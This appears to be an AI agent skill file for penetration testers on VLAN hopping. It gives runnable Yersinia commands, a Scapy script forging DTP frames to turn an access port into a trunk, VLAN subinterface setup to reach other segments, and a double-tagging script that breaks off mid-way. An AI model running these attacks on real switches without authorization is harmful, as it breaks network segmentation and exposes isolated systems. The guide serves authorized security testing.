---
name: performing-vlan-hopping-attack
description: "Performs VLAN hopping attacks. Signals: red team, methodology, penetration testing workflow."
zh-signals: "Performing VLAN Hopping Attack 信号:红队,方法论,渗透流程。"
when-to-use: >-
  Simulates VLAN hopping attacks using switch spoofing and 802.1Q double
  tagging techniques in authorized lab environments to test VLAN segmentation
  effectiveness and switch port security. Use during an authorized
  penetration test to validate trunk port hardening, confirm DTP is disabled
  on access ports, and demonstrate Layer 2 segmentation bypass risk to
  network teams.
domain: cybersecurity
subdomain: network-security
tags:
- network-security
- vlan-hopping
- layer2-attack
- switch-security
- 802.1q
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
mitre_attack:
- T1046
- T1040
- T1557
- T1071
- T1027
---
# Performing VLAN Hopping Attack

## When to Use

- Testing the effectiveness of VLAN-based network segmentation during authorized penetration tests
- Validating that switch trunk port configurations prevent unauthorized VLAN access
- Assessing whether 802.1Q tagging and native VLAN configurations resist double-tagging attacks
- Demonstrating to network teams why proper switch hardening is critical for isolation between zones
- Verifying that DTP (Dynamic Trunking Protocol) is disabled on all access ports

**Do not use** on production switches without explicit authorization and change management approval, against critical infrastructure VLANs (SCADA, medical devices) without safety controls, or as a denial-of-service vector.

## Prerequisites

- Written authorization specifying in-scope VLANs and switches for testing
- Physical or virtual access to a switch access port on the target network
- Yersinia, Scapy, and frogger VLAN hopping tools installed on Kali Linux
- Understanding of 802.1Q trunking, DTP, and VLAN tagging at the frame level
- Access to switch CLI for verification of configurations (read-only is sufficient)
- Wireshark for capturing and verifying tagged frames


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1: Enumerate VLAN Configuration

```bash
# Identify the current VLAN assignment of the attacker port
ip link show eth0
cat /proc/net/vlan/config 2>/dev/null

# Use CDP/LLDP to discover switch information
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether proto 0x88cc' 2>/dev/null
# Or use lldpd
lldpcli show neighbors

# If CDP is enabled, capture CDP frames
sudo tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'

# Use Yersinia to discover DTP and VTP information
sudo yersinia -G &
# Or command line:
sudo yersinia dtp -attack 0 -interface eth0
# This listens for DTP frames to learn trunk negotiation status

# Nmap to identify hosts on other VLANs (if routing exists)
nmap -sn 10.10.10.0/24 10.10.20.0/24 10.10.30.0/24
```

### Step 2: Attempt Switch Spoofing (DTP Attack)

```bash
# Use Yersinia to send DTP frames and negotiate a trunk
sudo yersinia dtp -attack 1 -interface eth0

# This sends DTP desirable frames to convert the access port to a trunk
# If successful, the port becomes a trunk carrying all VLANs

# Alternatively, use Scapy to craft DTP frames
python3 << 'PYEOF'
from scapy.all import *
from scapy.contrib.dtp import *

# Send DTP desirable frame to negotiate trunk
dtp_frame = (
    Ether(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr("eth0")) /
    LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
    SNAP(OUI=0x00000c, code=0x2004) /
    DTP(tlvlist=[
        DTPDomain(type=0x0001, domain=""),
        DTPStatus(type=0x0002, status=b"\x03"),  # Desirable
        DTPType(type=0x0003, dtptype=b"\xa5"),    # 802.1Q trunk
        DTPNeighbor(type=0x0004, neighbor=get_if_hwaddr("eth0"))
    ])
)

sendp(dtp_frame, iface="eth0", count=10, inter=1)
print("[*] DTP desirable frames sent. Check if trunk is negotiated.")
PYEOF

# If trunk negotiation succeeds, verify by capturing tagged frames
sudo tcpdump -en -i eth0 'vlan' -c 10

# Create VLAN subinterfaces to access other VLANs
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.10 type vlan id 10
sudo ip addr add 10.10.10.99/24 dev eth0.10
sudo ip link set eth0.10 up

sudo ip link add link eth0 name eth0.20 type vlan id 20
sudo ip addr add 10.10.20.99/24 dev eth0.20
sudo ip link set eth0.20 up

# Verify access to other VLANs
ping -c 3 10.10.10.1
ping -c 3 10.10.20.1
```

### Step 3: Attempt Double Tagging Attack

```bash
# Double tagging works when:
# 1. Attacker is on the native VLAN of the trunk
# 2. Target VLAN is different from the native VLAN
# 3. The switch strips the outer tag and forwards the inner tag

python3 << 'PYEOF'
from scapy.all import *

# Craft double-tagged frame
# Outer tag: Native VLAN (e.g., VLAN 1)

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
